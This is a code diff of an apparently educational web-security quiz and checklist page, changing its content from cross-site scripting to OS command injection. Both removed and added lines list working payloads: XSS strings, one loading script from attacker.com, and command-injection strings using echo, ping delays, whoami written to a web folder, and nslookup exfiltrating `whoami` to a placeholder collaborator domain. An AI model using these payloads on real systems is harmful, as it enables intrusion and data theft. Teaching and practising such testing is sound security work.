+["Why must `&` be encoded as `%26` in form-encoded requests?",["The server parses `&` as a new form field instead of payload","The server parses `&` as an SQL injection attempt entirely","The server parses `&` as a directory traversal attack safely","The server parses `&` as an invalid HTTP header locally now"],0,
+"Without encoding, the server parses `&` as 'new form field' instead of part of your payload value."]
 ];
 
 const CHECKLIST_DATA = [
-  { title: "1. Identify Input Reflection", items: [
-    "Look for URL parameters, form fields, and search boxes reflecting input.",
-    "Check if input is reflected in the HTML body, inside attributes, or in JS variables.",
-    "Test HTTP headers (User-Agent, Referer) for reflection in admin panels."
+  { title: "1. Identify OS Interaction Points", items: [
+    "Look for features interacting with the system (Ping tools, file converters, ?cmd=, ?file=).",
+    "Identify input fields that might be passed to system commands.",
+    "Determine the operating system (Linux vs Windows) using headers or extensions."
   ]},
-  { title: "2. Test HTML Context", items: [
-    "Inject basic tags: <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>",
-    "Try event handlers: <code>&lt;img src=x onerror=alert(1)&gt;</code>",
-    "Use unique canary strings to confirm exact reflection points."
+  { title: "2. Test Visible Output (Direct Injection)", items: [
+    "Inject an echo test with a random string: <code>& echo aiwefwlguh &</code>.",
+    "Check the HTTP response for the random string to confirm execution.",
+    "Try different separators: <code>;</code> (Linux), <code>|</code> (Pipe), <code>&&</code> (Conditional)."
   ]},
-  { title: "3. Test Attribute Context", items: [
-    "Break out of quotes: <code>\" onmouseover=\"alert(1)</code>",
-    "Try autofocus triggers: <code>\" autofocus onfocus=alert(1) //</code>"
+  { title: "3. Test Blind Time Delays", items: [
+    "If no output is visible, try time delays.",
+    "Linux: <code>& ping -c 10 127.0.0.1 &</code>",
+    "Windows: <code>& ping -n 10 127.0.0.1 &</code>",
+    "Measure response time. A 10-second delay confirms injection."
   ]},
-  { title: "4. Test JavaScript Context", items: [
-    "Break out of strings: <code>';alert(1);//</code>",
-    "Use template literals: <code>${alert(1)}</code>"
+  { title: "4. Test Blind Output Redirection", items: [
+    "If time delay works, try writing output to a public folder.",
+    "Payload: <code>& whoami > /var/www/images/whoami.txt &</code>",
+    "Browse to <code>/images/whoami.txt</code> to read the output."
   ]},
-  { title: "5. Test DOM-Based & Blind XSS", items: [
-    "Check sources like <code>location.hash</code> flowing to <code>innerHTML</code>.",
-    "Use Burp Collaborator or XSS Hunter for Blind XSS payloads in feedback forms.",
-    "Verify CSP headers to see if inline scripts are blocked."
+  { title: "5. Test Out-of-Band (OAST)", items: [
+    "If file writes fail, use Burp Collaborator to get a domain.",
+    "Payload: <code>& nslookup YOUR-DOMAIN.com &</code>",
+    "Exfiltrate data: <code>& nslookup `whoami`.YOUR-DOMAIN.com &</code>",
+    "Check Collaborator logs for DNS hits containing the stolen data."
   ]}
 ];
 
 const PAYLOADS = [
-  { name: "1. HTML Context", code: "<script>alert(1)<\/script>\n<img src=x onerror=alert(1)>\n<svg onload=alert(1)>" },
-  { name: "2. Attribute Context", code: "\" onmouseover=\"alert(1)\n' autofocus onfocus='alert(1)" },
-  { name: "3. JavaScript Context", code: "';alert(1);//\n<\/script><script>alert(1)<\/script>" },
-  { name: "4. DOM Context (Hash)", code: "#<img src=x onerror=alert(1)>" },
-  { name: "5. Blind XSS (Header)", code: "User-Agent: <script src=//attacker.com/x.js><\/script>" }
+  { name: "1. Visible Output (Echo Test)", code: "& echo aiwefwlguh &\n; echo aiwefwlguh ;\n| echo aiwefwlguh" },
+  { name: "2. Blind Time Delay (Linux)", code: "& ping -c 10 127.0.0.1 &\n; ping -c 10 127.0.0.1 ;" },
+  { name: "3. Blind Time Delay (Windows)", code: "& ping -n 10 127.0.0.1 &" },
+  { name: "4. Blind File Redirect", code: "& whoami > /var/www/images/whoami.txt &" },
+  { name: "5. OAST Exfiltration", code: "& nslookup `whoami`.YOUR-COLLABORATOR-DOMAIN.com &" }
 ];
 
 let cur=0,score=0;
@@ -568,7 +574,7 @@ function closeCheatWarning() {
 
 function buildChecklist(){
   const c=document.getElementById('checklist');
-  const saved=JSON.parse(localStorage.getItem('xss_v1')||'{}');
+  const saved=JSON.parse(localStorage.getItem('os_cmd_v2')||'{}');
   let html='';
   let idx=0;
   CHECKLIST_DATA.forEach(section => {
@@ -592,7 +598,7 @@ function buildChecklist(){
       const row = checkbox.parentElement;
       checkbox.onchange = e => {
         saved[idx] = e.target.checked;
-        localStorage.setItem('xss_v1', JSON.stringify(saved));
+        localStorage.setItem('os_cmd_v2', JSON.stringify(saved));
         row.classList.toggle('done', e.target.checked);
       };
       idx++;
